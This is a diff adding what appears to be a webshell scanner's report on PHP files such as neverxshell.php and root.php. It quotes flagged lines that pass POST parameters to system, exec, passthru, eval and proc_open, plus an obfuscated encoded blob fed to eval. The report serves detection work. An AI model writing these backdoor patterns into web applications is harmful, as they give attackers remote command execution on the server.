@@ -1,0 +1,54 @@
+
+[d:\office\2008.php] :
+	|-- [eval]  line [1135] 
+		code:eval("?".">$phpcode<?");
+	|-- [exec]  line [1224] 
+		code:$exec = $wsh->exec('cmd.exe /c '.$command);
+	|-- [proc_open]  line [1234] 
+		code:$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
+	|-- [exec]  line [1398] 
+		code:@exec($cfe,$res);
+	|-- [shell_exec]  line [1401] 
+		code:$res = @shell_exec($cfe);
+	|-- [system]  line [1404] 
+		code:@system($cfe);
+	|-- [passthru]  line [1409] 
+		code:@passthru($cfe);
+	|-- [popen]  line [1412] 
+		code:} elseif(@is_resource($f = @popen($cfe,"r"))) {
+	|-- [eval]  line [1730] 
+		code:eval('$hexdtime = "' . $hexdtime . '";');
+
+[d:\office\neverxshell.php] :
+	|-- [eval]  line [67] 
+		code:eval("?".">$_POST[phpcode]<?");
+	|-- [system]  line [663] 
+		code:system($_POST['command']);
+	|-- [passthru]  line [665] 
+		code:passthru($_POST['command']);
+	|-- [exec]  line [667] 
+		code:$result = exec($_POST['command']);
+	|-- [shell_exec]  line [670] 
+		code:$result=shell_exec($_POST['command']);
+	|-- [popen]  line [673] 
+		code:$pp = popen($_POST['command'], 'r');
+	|-- [exec]  line [679] 
+		code:$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
+	|-- [proc_open]  line [689] 
+		code:$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
+	|-- [system]  line [709] 
+		code:system($_POST['command']);
+	|-- [eval]  line [1295] 
+		code:eval('$hexdtime = "' . $hexdtime . '";');
+
+[d:\office\root.php] :
+	|-- [eval]  line [7] 
+		code:$o='C8f+0lQNsshplL96mmlZZXjG0RwfmExQO7HS6v+3rxmz0IwlP2bSBkJg0lp8POVwlJarMI/xJFzvzWKsmtRltzuIuki4PQxz
+
+[d:\office\test6.php] :
+	|-- [eval]  line [8] 
+		code:eval($data);
+	|-- [``] command is [ $x ] in line [28] 
+		code:` $x ` ;
+	|-- [eval]  line [29] 
+		code:eval($m);
